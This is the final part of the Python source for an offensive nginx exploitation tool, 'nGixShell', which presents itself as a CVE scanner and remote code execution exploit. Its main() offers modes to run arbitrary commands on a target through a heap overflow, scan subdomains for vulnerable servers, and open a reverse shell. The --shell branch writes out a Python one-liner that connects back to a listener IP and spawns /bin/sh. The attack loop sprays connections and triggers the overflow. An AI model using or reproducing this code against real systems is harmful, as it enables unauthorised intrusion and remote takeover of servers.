        "═" * 60,
        "  NGINX-RIFT — EXPLOIT REPORT",
        "═" * 60,
        f"  Target          : {target}",
        f"  Command         : {cmd}",
        f"  Result          : {'SUCCESS' if success else 'FAILURE'}",
        f"  Elapsed         : {elapsed:.1f}s",
        f"  Candidates tried: {candidates_tried}",
        f"  Total attempts  : {total_attempts}",
    ]
    if winner_addr is not None:
        lines.append(f"  Winning address : 0x{winner_addr:012x}")
    if winner_try is not None:
        lines.append(f"  Winning attempt : {winner_try}")
    lines.append("═" * 60)
    log("\n".join(lines))


# ─── Entry point ──────────────────────────────────────────────────────────────

def main() -> int:
    global _verbose, _tmul, _log_fh

    parser = argparse.ArgumentParser(
        description="nGixShell — nginx CVE scanner + RCE exploit (CVE-2026-42945 + 16 others)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  %(prog)s --list-cves\n"
            "  %(prog)s --cve-scan --host 127.0.0.1 --port 19321\n"
            "  %(prog)s --cve CVE-2017-7529 --host 127.0.0.1 --port 80\n"
            "  %(prog)s --subdomain-scan example.com --scan-port 443 --scan-tls\n"
            "  %(prog)s --cmd 'id' --host 127.0.0.1 --report\n"
            "  %(prog)s --shell --listen-ip 10.0.0.1 --listen-port 4444\n"
        ),
    )

    # ── Mode — exactly one required ──────────────────────────────────────────
    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument("--cmd",             metavar="CMD",
                      help="shell command to execute (CVE-2026-42945 exploit)")
    mode.add_argument("--cmd-file",        metavar="FILE",
                      help="file with commands (one per line, joined with ;)")
    mode.add_argument("--shell",           action="store_true",
                      help="open reverse shell (CVE-2026-42945 exploit)")
    mode.add_argument("--check",           action="store_true",
                      help="check if target runs a vulnerable nginx version")
    mode.add_argument("--dry-run",         action="store_true",
                      help="probe and list candidates without triggering the overflow")
    mode.add_argument("--list-candidates", action="store_true",
                      help="print heap candidates (no network needed)")
    mode.add_argument("--list-cves",       action="store_true",
                      help="print all CVEs in the database and exit")
    mode.add_argument("--cve-scan",        action="store_true",
                      help="detect nginx version and test all CVEs in database")
    mode.add_argument("--cve",             metavar="CVE-ID",
                      help="test a single CVE from the database (e.g. CVE-2017-7529)")
    mode.add_argument("--subdomain-scan",  metavar="DOMAIN",
                      help="scan subdomains of DOMAIN for vulnerable nginx")

    # ── Target ───────────────────────────────────────────────────────────────
    parser.add_argument("--host",  default="127.0.0.1", help="target host (default: 127.0.0.1)")
    parser.add_argument("--port",  type=int, default=19321, help="target port (default: 19321)")
    parser.add_argument("--tls",   action="store_true", help="use TLS/HTTPS")
    parser.add_argument("--proxy", metavar="URL",
                        help="HTTP CONNECT proxy, e.g. http://127.0.0.1:8080")

    # ── Reverse shell ────────────────────────────────────────────────────────
    parser.add_argument("--listen-port", type=int, default=1337,
                        help="reverse shell listen port (default: 1337)")
    parser.add_argument("--listen-ip",   default="172.17.0.1",
                        help="reverse shell callback IP (default: 172.17.0.1)")

    # ── Exploit tuning ───────────────────────────────────────────────────────
    parser.add_argument("--tries",    type=int,   default=10,
                        help="attempts per heap candidate (default: 10)")
    parser.add_argument("--spray",    type=int,   default=20,
                        help="spray connections per attempt (default: 20)")
    parser.add_argument("--body-len", type=int,   default=4000,
                        help="spray body size in bytes (default: 4000)")
    parser.add_argument("--timeout-multiplier", type=float, default=1.0, metavar="X",
                        help="scale all sleeps by X for high-latency targets (default: 1.0)")

    # ── Subdomain scan ───────────────────────────────────────────────────────
    parser.add_argument("--wordlist",     metavar="FILE",
                        help="subdomain wordlist file (default: built-in list)")
    parser.add_argument("--scan-port",    type=int,   default=80,
                        help="port for subdomain scan (default: 80)")
    parser.add_argument("--scan-tls",     action="store_true",
                        help="use HTTPS for subdomain scan")
    parser.add_argument("--scan-threads", type=int,   default=20,
                        help="concurrent threads for subdomain scan (default: 20)")
    parser.add_argument("--scan-timeout", type=float, default=5.0,
                        help="per-host timeout in seconds (default: 5.0)")

    # ── Output ───────────────────────────────────────────────────────────────
    parser.add_argument("--output",  metavar="FILE",
                        help="write all output to FILE in addition to stdout")
    parser.add_argument("--report",  action="store_true",
                        help="print structured exploit summary at end of run")
    parser.add_argument("--verbose", action="store_true",
                        help="print debug info including caught exceptions")

    args = parser.parse_args()

    print(BANNER)

    # Validate --cve argument against database
    if args.cve and args.cve not in CVE_DB:
        parser.error(f"Unknown CVE '{args.cve}'. Use --list-cves to see available IDs.")

    # Apply session globals before any function call
    _verbose = args.verbose
    _tmul    = args.timeout_multiplier
    if args.output:
        _log_fh = open(args.output, "w", encoding="utf-8")

    start = time.monotonic()

    try:
        # ── --list-cves (no network) ──────────────────────────────────────────
        if args.list_cves:
            list_cves()
            return 0

        # ── --list-candidates (no network) ────────────────────────────────────
        if args.list_candidates:
            list_candidates()
            return 0

        # ── --cve-scan ────────────────────────────────────────────────────────
        if args.cve_scan:
            findings = cve_scan(args.host, args.port, args.tls, args.proxy)
            return 0 if not findings else 1

        # ── --cve CVE-ID ──────────────────────────────────────────────────────
        if args.cve:
            findings = cve_scan(args.host, args.port, args.tls, args.proxy,
                                target_cve=args.cve)
            return 0 if not findings else 1

        # ── --subdomain-scan ──────────────────────────────────────────────────
        if args.subdomain_scan:
            if args.wordlist:
                with open(args.wordlist, encoding="utf-8") as f:
                    wordlist = [l.strip() for l in f if l.strip()]
            else:
                wordlist = COMMON_SUBDOMAINS
            subdomain_scan(
                domain=args.subdomain_scan,
                wordlist=wordlist,
                port=args.scan_port,
                tls=args.scan_tls,
                proxy=args.proxy,
                n_threads=args.scan_threads,
                timeout=args.scan_timeout,
            )
            return 0

        # ── --check ───────────────────────────────────────────────────────────
        if args.check:
            vuln, _ = check_target(args.host, args.port, args.tls, args.proxy)
            return 0 if vuln else 1

        # ── --dry-run ─────────────────────────────────────────────────────────
        if args.dry_run:
            log("[*] DRY RUN — overflow will NOT be triggered")
            log(f"[*] Target : {args.host}:{args.port}")
            check_target(args.host, args.port, args.tls, args.proxy)
            candidates = get_candidates()
            log(f"[*] Heap candidates : {len(candidates)}/{len(PREREAD_HEAP_OFFSETS)} pass URI-safe filter")
            list_candidates()
            log(f"[*] Spray plan      : {args.spray} connections × {args.body_len} bytes")
            log(f"[*] Tries per cand  : {args.tries}")
            alive = wait_alive(args.host, args.port, timeout=10,
                               tls=args.tls, proxy=args.proxy)
            log(f"[{'+'  if alive else '!'}] nginx {'responding' if alive else 'NOT responding'}")
            return 0 if alive else 1

        # ── Exploit modes (--cmd, --cmd-file, --shell) ────────────────────────
        if args.cmd_file:
            with open(args.cmd_file, encoding="utf-8") as f:
                cmds = [l.strip() for l in f if l.strip()]
            cmd = "; ".join(cmds)
            log(f"[*] Loaded {len(cmds)} commands from {args.cmd_file}")
        elif args.shell:
            cmd = (
                f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect((\"{args.listen_ip}\",{args.listen_port}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/sh\",\"-i\"])'"
            )
            vlog(f"[v] Reverse shell command: {cmd}")
        else:
            cmd = args.cmd

        if args.shell:
            log(f"[*] Listening for reverse shell on :{args.listen_port} ...")
            start_shell_listener(args.listen_port)
            _sleep(1)

        candidates = get_candidates()
        if not candidates:
            log("[!] No safe heap candidates — exploit cannot proceed.")
            return 1
        log(f"[*] {len(candidates)} safe candidates from {len(PREREAD_HEAP_OFFSETS)} offsets")

        primary_addr = candidates[0][1]
        data_addr    = primary_addr + FAKE_STRUCT_SIZE
        body         = make_body(cmd, data_addr, args.body_len)

        log(f"[*] Waiting for nginx on {args.host}:{args.port} ...")
        if not wait_alive(args.host, args.port, tls=args.tls, proxy=args.proxy):
            log("[!] nginx not responding")
            return 1
        log("[+] Connected.")

        success          = False
        winner_addr      = None
        winner_try       = None
        total_attempts   = 0
        candidates_tried = 0

        for ci, (_, addr) in enumerate(candidates):
            target = bytes([(addr >> (j * 8)) & 0xff for j in range(6)])
            candidates_tried += 1

            for attempt_num in range(args.tries):
                total_attempts += 1
                log(f"  [candidate {ci+1}/{len(candidates)}] "
                    f"[try {attempt_num+1}/{args.tries}] "
                    f"addr=0x{addr:012x}")

                if not wait_alive(args.host, args.port, timeout=10,
                                  tls=args.tls, proxy=args.proxy):
                    _sleep(2)
                    if not wait_alive(args.host, args.port, timeout=10,
                                      tls=args.tls, proxy=args.proxy):
                        log("    server not recovering, aborting")
                        return 1

                crashed = attempt(args.host, args.port, target, body,
                                  args.spray, args.body_len,
                                  tls=args.tls, proxy=args.proxy)
                if crashed:
                    success     = True
                    winner_addr = addr
                    winner_try  = attempt_num + 1
                    if args.shell:
                        log("[+] Crash detected — waiting for shell (Ctrl+C to exit)...")
                        try:
                            while True:
                                _sleep(1)
                        except KeyboardInterrupt:
                            pass
                    else:
                        log(f"[+] try {attempt_num+1}/{args.tries} crashed — "
                            f"system(\"{cmd}\") executed")
                    log("[+] Done.")
                    break
                _sleep(0.3)

            if success:
                break

        if not success:
            log("[+] All candidates tried — no crash detected.")

        if args.report:
            print_report(
                target=f"{args.host}:{args.port}",
                cmd=cmd,
                success=success,
                elapsed=time.monotonic() - start,
                winner_addr=winner_addr,
                winner_try=winner_try,
                total_attempts=total_attempts,
                candidates_tried=candidates_tried,
            )

        return 0 if success else 1

    finally:
        if _log_fh:
            _log_fh.close()


if __name__ == "__main__":
    sys.exit(main())
